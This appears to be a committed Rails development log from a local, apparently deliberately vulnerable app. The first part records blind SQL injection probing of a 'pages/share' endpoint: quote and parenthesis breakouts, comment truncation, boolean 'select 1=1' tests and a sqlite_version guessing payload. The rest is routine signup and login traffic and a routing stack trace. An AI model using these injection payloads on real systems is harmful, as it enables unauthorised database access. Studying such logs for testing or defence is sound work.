+  [1m[36mPage Exists? (0.6ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (3) ) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 0.8ms | Allocations: 2224)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: near ")": syntax error):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=2" for ::1 at 2020-09-24 22:03:32 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["2"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.3ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 9ms (Views: 1.2ms | ActiveRecord: 0.7ms | Allocations: 2607)
+
+
+Started GET "/pages/share?page_id[]=10" for ::1 at 2020-09-24 22:03:41 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["10"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (10) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 10], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 5ms (ActiveRecord: 0.5ms | Allocations: 2566)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=10):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id[]=10%20%27" for ::1 at 2020-09-24 22:03:47 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["10 '"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.7ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (10 ') LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 0.8ms | Allocations: 2222)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: unrecognized token: "') LIMIT ?"):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=10)" for ::1 at 2020-09-24 22:04:05 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["10)"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.8ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (10)) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 5ms (ActiveRecord: 1.0ms | Allocations: 2222)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: near ")": syntax error):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=10)" for ::1 at 2020-09-24 22:04:08 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["10)"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.7ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (10)) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 5ms (ActiveRecord: 0.9ms | Allocations: 2222)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: near ")": syntax error):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=10)%20LIMIT%201" for ::1 at 2020-09-24 22:04:12 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["10) LIMIT 1"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.5ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (10) LIMIT 1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 3ms (ActiveRecord: 0.6ms | Allocations: 2222)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: near ")": syntax error):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=10)%20LIMIT%201%20--%20-" for ::1 at 2020-09-24 22:04:16 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["10) LIMIT 1 -- -"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.7ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (10) LIMIT 1 -- -) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 5ms (ActiveRecord: 0.9ms | Allocations: 2235)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::RangeException: column index out of range):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=1)%20LIMIT%201%20--%20-" for ::1 at 2020-09-24 22:04:25 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1) LIMIT 1 -- -"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.6ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1) LIMIT 1 -- -) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 3ms (ActiveRecord: 0.8ms | Allocations: 2235)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::RangeException: column index out of range):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=1)%20and%20id=1%20--%20-" for ::1 at 2020-09-24 22:04:38 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1) and id=1 -- -"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.7ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1) and id=1 -- -) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 0.8ms | Allocations: 2235)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::RangeException: column index out of range):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=select%201=2" for ::1 at 2020-09-24 22:08:38 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select 1=2"]}
+  [1m[36mUser Load (158.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (13.8ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select 1=2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
+Completed 200 OK in 262ms (Views: 1.8ms | ActiveRecord: 172.2ms | Allocations: 1857)
+
+
+Started GET "/pages/share?page_id[]=select%201=1" for ::1 at 2020-09-24 22:08:45 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select 1=1"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select 1=1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 94ms (ActiveRecord: 0.4ms | Allocations: 2564)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=select 1=1):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id[]=select%201" for ::1 at 2020-09-24 22:09:10 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select 1"]}
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.6ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select 1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 10ms (ActiveRecord: 1.2ms | Allocations: 2563)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=select 1):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id[]=select%201=1" for ::1 at 2020-09-24 22:09:14 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select 1=1"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select 1=1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 5ms (ActiveRecord: 0.5ms | Allocations: 2563)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=select 1=1):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id[]=select%201=2" for ::1 at 2020-09-24 22:09:15 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select 1=2"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select 1=2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
+Completed 200 OK in 4ms (Views: 0.9ms | ActiveRecord: 0.3ms | Allocations: 1855)
+
+
+Started GET "/pages/share?page_id[]=select%201=3" for ::1 at 2020-09-24 22:09:17 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select 1=3"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select 1=3) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
+Completed 200 OK in 4ms (Views: 1.0ms | ActiveRecord: 0.4ms | Allocations: 1861)
+
+
+Started GET "/pages/share?page_id[]=select%20sqlite_version()=%273.27.1%27" for ::1 at 2020-09-24 22:10:47 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select sqlite_version()='3.27.1'"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select sqlite_version()='3.27.1') LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
+Completed 200 OK in 5ms (Views: 0.9ms | ActiveRecord: 0.4ms | Allocations: 1858)
+
+
+Started GET "/pages/share?page_id[]=select%20sqlite_version()=%273.27.2%27" for ::1 at 2020-09-24 22:10:50 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select sqlite_version()='3.27.2'"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.1ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select sqlite_version()='3.27.2') LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 4ms (ActiveRecord: 0.3ms | Allocations: 2573)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=select sqlite_version()='3.27.2'):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/new" for ::1 at 2020-09-24 22:16:52 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#new as HTML
+  [1m[36mUser Load (14.9ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  Rendering pages/new.html.erb within layouts/application
+  Rendered pages/new.html.erb within layouts/application (Duration: 8.1ms | Allocations: 1150)
+Completed 200 OK in 120ms (Views: 9.9ms | ActiveRecord: 14.9ms | Allocations: 11584)
+
+
+Started POST "/pages" for ::1 at 2020-09-24 22:16:56 +0800
+Processing by PagesController#create as HTML
+  Parameters: {"authenticity_token"=>"GADtCkchGS92TOZBEyKJNvv6PyqH2Fh7xOlwg3eyBHyWUawIK9dZ4bTJWjAnqd1UdOS1IMWQsM0nUSdR73K5zA==", "page"=>{"title"=>"asd", "text"=>"asdsad"}, "commit"=>"Save Page"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/pages_controller.rb:20:in `create'
+  [1m[36mPage Create (54.4ms)[0m  [1m[32mINSERT INTO "pages" ("title", "text", "created_at", "updated_at") VALUES (?, ?, ?, ?)[0m  [["title", "asd"], ["text", "asdsad"], ["created_at", "2020-09-24 14:16:56.924367"], ["updated_at", "2020-09-24 14:16:56.924367"]]
+  ↳ app/controllers/pages_controller.rb:20:in `create'
+  [1m[35m (123.2ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/pages_controller.rb:20:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 206ms (ActiveRecord: 177.9ms | Allocations: 4890)
+
+
+Started GET "/" for ::1 at 2020-09-24 22:16:57 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 7.0ms | Allocations: 1368)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 25ms (Views: 23.6ms | ActiveRecord: 0.1ms | Allocations: 3231)
+
+
+Started GET "/register" for ::1 at 2020-09-24 22:32:59 +0800
+  [1m[35m (0.8ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 48.9ms | Allocations: 3780)
+Completed 200 OK in 70ms (Views: 53.4ms | ActiveRecord: 1.5ms | Allocations: 15004)
+
+
+Started GET "/register" for ::1 at 2020-09-24 22:33:16 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.5ms | Allocations: 1033)
+Completed 200 OK in 5ms (Views: 3.7ms | ActiveRecord: 0.0ms | Allocations: 1692)
+
+
+Started GET "/register" for ::1 at 2020-09-24 22:33:16 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.2ms | Allocations: 1030)
+Completed 200 OK in 6ms (Views: 5.0ms | ActiveRecord: 0.0ms | Allocations: 1688)
+
+
+Started GET "/register" for ::1 at 2020-09-24 22:33:16 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.7ms | Allocations: 1029)
+Completed 200 OK in 8ms (Views: 5.4ms | ActiveRecord: 0.0ms | Allocations: 1678)
+
+
+Started GET "/register" for ::1 at 2020-09-24 22:33:17 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.7ms | Allocations: 1030)
+Completed 200 OK in 6ms (Views: 4.1ms | ActiveRecord: 0.0ms | Allocations: 1684)
+
+
+Started GET "/register" for ::1 at 2020-09-24 22:33:17 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.5ms | Allocations: 1030)
+Completed 200 OK in 6ms (Views: 5.0ms | ActiveRecord: 0.0ms | Allocations: 1685)
+
+
+Started GET "/register" for ::1 at 2020-09-24 22:33:17 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.8ms | Allocations: 1029)
+Completed 200 OK in 6ms (Views: 4.5ms | ActiveRecord: 0.0ms | Allocations: 1678)
+
+
+Started GET "/register" for ::1 at 2020-09-24 22:33:17 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.5ms | Allocations: 1029)
+Completed 200 OK in 7ms (Views: 4.9ms | ActiveRecord: 0.0ms | Allocations: 1678)
+
+
+Started GET "/register" for ::1 at 2020-09-24 22:33:21 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.6ms | Allocations: 1042)
+Completed 200 OK in 6ms (Views: 5.3ms | ActiveRecord: 0.0ms | Allocations: 1603)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:07:41 +0800
+  [1m[35m (1.8ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 18.5ms | Allocations: 4783)
+Completed 200 OK in 45ms (Views: 24.2ms | ActiveRecord: 1.1ms | Allocations: 11791)
+
+
+Started POST "/users" for ::1 at 2021-03-29 12:07:54 +0800
+Processing by UsersController#create as HTML
+  Parameters: {"authenticity_token"=>"hu7v33s1Am1HwpOUPuU3LMAJZBmoryKOHNviPqhkmrULxEwxTQMKvD393FYlEqe7d+FX8qAASDp/WCtlvgchew==", "user"=>{"name"=>"yeraisci", "email"=>"yeraisci@mail.com", "password"=>"[FILTERED]", "password_confirmation"=>"[FILTERED]"}, "commit"=>"Sign up!"}
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[36mUser Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "yeraisci@mail.com"], ["LIMIT", 1]]
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[36mUser Create (0.4ms)[0m  [1m[32mINSERT INTO "users" ("name", "email", "password_digest", "created_at", "updated_at") VALUES (?, ?, ?, ?, ?)[0m  [["name", "yeraisci"], ["email", "yeraisci@mail.com"], ["password_digest", "$2a$12$nN3S7Okx9UDUDZ5THeMo2ucJSMbIq/uFyXKCkdlAvTX66bA8m6dnW"], ["created_at", "2021-03-29 04:07:55.226693"], ["updated_at", "2021-03-29 04:07:55.226693"]]
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[35m (2.8ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 367ms (ActiveRecord: 3.5ms | Allocations: 6017)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:07:55 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.9ms | Allocations: 945)
+Completed 200 OK in 6ms (Views: 4.4ms | ActiveRecord: 0.0ms | Allocations: 1573)
+
+
+Started GET "/login" for ::1 at 2021-03-29 12:07:57 +0800
+Processing by SessionsController#new as HTML
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 3.3ms | Allocations: 962)
+Completed 200 OK in 8ms (Views: 6.5ms | ActiveRecord: 0.0ms | Allocations: 2124)
+
+
+Started POST "/login" for ::1 at 2021-03-29 12:08:04 +0800
+Processing by SessionsController#create as HTML
+  Parameters: {"authenticity_token"=>"sQPD2Jo2T1zOG99GgExFiStxlBBM0fGFCsknyr17NdQA0hSy54/XrYftxtv+b3m/Zxb/cdwqRu/dzib5qBo3+w==", "login"=>{"email"=>"yeraisci@mail.com", "password"=>"[FILTERED]"}, "commit"=>"Log In"}
+  [1m[36mUser Load (0.5ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "yeraisci@mail.com"], ["LIMIT", 1]]
+  ↳ app/controllers/sessions_controller.rb:11:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 447ms (ActiveRecord: 0.5ms | Allocations: 1109)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:08:04 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.3ms | Allocations: 951)
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 7ms (Views: 5.9ms | ActiveRecord: 0.3ms | Allocations: 2268)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:08:12 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.2ms | Allocations: 941)
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 8ms (Views: 6.4ms | ActiveRecord: 0.3ms | Allocations: 2105)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:08:13 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.1ms | Allocations: 941)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 9ms (Views: 6.7ms | ActiveRecord: 0.2ms | Allocations: 2114)
+
+
+Started GET "/pages" for ::1 at 2021-03-29 12:08:15 +0800
+  
+ActionController::RoutingError (No route matches [GET] "/pages"):
+  
+actionpack (6.0.3.3) lib/action_dispatch/middleware/debug_exceptions.rb:36:in `call'
+web-console (4.0.4) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.0.4) lib/web_console/middleware.rb:28:in `block in call'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.0.3.3) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `block in tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:28:in `tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `tagged'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.2.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/request_id.rb:27:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.0.3.3) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/static.rb:126:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/host_authorization.rb:82:in `call'
+webpacker (4.3.0) lib/webpacker/dev_server_proxy.rb:23:in `perform_request'
+rack-proxy (0.6.5) lib/rack/proxy.rb:57:in `call'
+railties (6.0.3.3) lib/rails/engine.rb:527:in `call'
+puma (4.3.6) lib/puma/configuration.rb:228:in `call'
